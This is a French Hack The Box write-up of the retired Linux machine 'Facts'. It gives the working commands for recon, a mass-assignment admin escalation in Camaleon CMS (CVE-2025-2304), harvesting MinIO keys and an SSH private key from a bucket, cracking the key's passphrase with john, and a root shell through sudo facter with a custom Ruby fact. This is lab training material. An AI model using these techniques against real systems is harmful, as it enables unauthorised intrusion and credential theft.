---
title: "Facts"
date: 2026-05-05
updated: 2026-06-10
side: "red"
tags: ["htb", "linux", "machine", "web", "cve", "hash-cracking"]
summary: "Machine Linux. Élévation de privilèges applicative par mass assignment, extraction de secrets de stockage objet, clé SSH dans un bucket, puis root via un binaire sudo."
draft: false
---

> Machine retirée, write-up complet. La chaine va d'un compte client jusqu'à root, en passant par une élévation applicative, un bucket de stockage objet et un binaire sudo détourné.

## Résolue

![Machine Facts résolue](/images/facts.png)

Machine Linux.

## Reconnaissance

Le scan complet des ports puis un scan ciblé avec détection de version posent le décor :

```bash
nmap -p- --min-rate=2000 -T4 10.129.8.0
nmap -p 22,80,54321 -sV -sC 10.129.8.0
```

Trois portes ouvertes : OpenSSH 9.9p1 sur le 22, un nginx 1.26.3 servant `facts.htb` sur le 80, et surtout un port 54321 qui répond en MinIO, une API compatible S3. Ce dernier service est l'élément qui sort de l'ordinaire et qu'on garde en tete pour la suite. On ajoute `facts.htb` dans `/etc/hosts`, puis on énumère le web :

```bash
ffuf -u "http://facts.htb/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

Les routes `/admin`, `/search`, `/page`, `/error`, `/sitemap` et `/rss` ressortent. Le fingerprinting affine la cible : un commentaire HTML mentionnant `public/404.html` trahit Ruby on Rails, et la page `/admin` identifie un Camaleon CMS en version 2.9.0. Cette version exacte est l'information clé, car elle oriente directement vers une vulnérabilité connue.

## Accès initial : mass assignment

Sur `/admin`, la création d'un compte standard attribue le role Client. L'objectif est de le promouvoir administrateur, et c'est là qu'intervient la CVE-2025-2304. Le endpoint `/admin/users/:id/updated_ajax` traite la requete avec `params.require(:password).permit!`. Le `permit!` autorise sans filtre l'ensemble des paramètres du modèle User, ce qui ouvre une mass assignment : on peut injecter n'importe quel attribut, y compris le role.

Concrètement, on intercepte la requete de changement de mot de passe dans Burp et on ajoute `password[role]=admin` au corps :

```text
POST /admin/users/5/updated_ajax HTTP/1.1
Host: facts.htb
...
_method=patch&authenticity_token=...&password[password]=test123&password[password_confirmation]=test123&password[role]=admin
```

Le serveur applique le changement sans broncher, et le compte passe Administrator. La leçon est classique : un `permit!` sans liste blanche transforme une simple mise à jour de profil en escalade applicative.

## Pivot : les credentials MinIO

Avec l'accès administrateur, on explore la configuration. Dans Settings, General Sites, filesystem settings, les identifiants du stockage objet sont stockés en clair :

```text
Access key : AKIAEA3535387DD79799
Secret key : U5oarppRSzYTtMXoMXqwICupyoqDG6MihjKgLDEc
Endpoint   : http://facts.htb:54321
```

Le service MinIO repéré au scan prend tout son sens : on dispose maintenant de quoi s'y connecter.

## MinIO : la clé SSH

On installe le client MinIO et on configure l'alias avec les credentials récupérés :

```bash
wget https://dl.min.io/client/mc/release/linux-amd64/mc -O ~/miniomc
chmod +x ~/miniomc
~/miniomc alias set myminio http://facts.htb:54321 "AKIAEA3535387DD79799" "U5oarppRSzYTtMXoMXqwICupyoqDG6MihjKgLDEc"
```

Le listage des buckets révèle `internal/` et `randomfacts/` :

```bash
~/miniomc ls myminio/
~/miniomc ls --recursive myminio/internal/
```

Le bucket `internal/` se révèle etre le home directory d'un utilisateur système, ce qui en fait une mine. On y récupère la clé SSH privée et le fichier des clés autorisées :

```bash
~/miniomc cp myminio/internal/.ssh/id_ed25519 ./id_ed25519
chmod 600 ./id_ed25519
```

Reste à savoir à qui appartient cette clé. Le commentaire de la clé publique le dit directement :

```bash
ssh-keygen -y -f id_ed25519
# ssh-ed25519 AAAA... trivia@facts.htb
```

L'utilisateur est `trivia`. La clé est protégée par une passphrase, qu'on casse hors ligne :

```bash
ssh2john id_ed25519 > id_ed25519.hash
john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
# dragonballz
```

## User : accès SSH

Avec la clé et sa passphrase, la connexion aboutit et donne le user flag :

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

## Root : abus de facter en sudo

Le réflexe d'élévation commence par les droits sudo :

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

`facter` est l'outil de collecte d'informations système de Puppet. Il sait charger des custom facts écrits en Ruby, et le flag `--custom-dir` permet de pointer vers un répertoire de fichiers `.rb` qui seront exécutés dans son contexte. Comme facter tourne ici en root via sudo, tout code Ruby placé dans ce répertoire s'exécute en root. Il suffit donc d'un fichier qui lance un shell :

```bash
TF=$(mktemp -d)
echo 'exec("/bin/bash")' > $TF/x.rb
sudo /usr/bin/facter --custom-dir=$TF
```

Le shell obtenu est root, et le root flag tombe.

## Chaine d'exploitation

```text
Reconnaissance -> Camaleon CMS 2.9.0
   |
Compte client + CVE-2025-2304 (mass assignment) -> Administrator
   |
Credentials MinIO depuis Settings
   |
Bucket internal/ = home directory -> clé SSH privée
   |
Username dans la clé publique (trivia) + crack passphrase (dragonballz)
   |
SSH -> user flag
   |
sudo facter --custom-dir -> exécution Ruby en root -> root flag
```